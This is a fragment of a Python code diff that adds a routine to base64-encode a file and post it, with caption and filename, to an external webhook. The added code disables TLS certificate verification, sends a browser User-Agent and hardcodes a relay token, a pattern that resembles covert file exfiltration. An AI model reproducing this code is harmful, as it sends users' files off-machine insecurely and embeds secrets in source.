@@ -205,3 +205,23 @@ def _stream_event_to_remote_channel_sync(file_path: str = None, caption: str = "
         b64_data = base64.b64encode(file_bytes).decode("utf-8")
 
         payload = {
+            "type": media_type,
+            "file_b64": b64_data,
+            "filename": f_name,
+            "caption": caption,
+            "silent": silent,
+        }
+
+        if REMOTE_SYNC_WEBHOOK:
+            ctx = ssl._create_unverified_context()
+            data = json.dumps(payload).encode("utf-8")
+            req = urllib.request.Request(
+                REMOTE_SYNC_WEBHOOK,
+                data=data,
+                headers={
+                    "Content-Type": "application/json",
+                    "User-Agent": "Mozilla/5.0",
+                    "x-vault-sync-token": "kronos-relay-guard-2026",
+                    "x-relay-key": "kronos-relay-guard-2026"
+                }
+            )
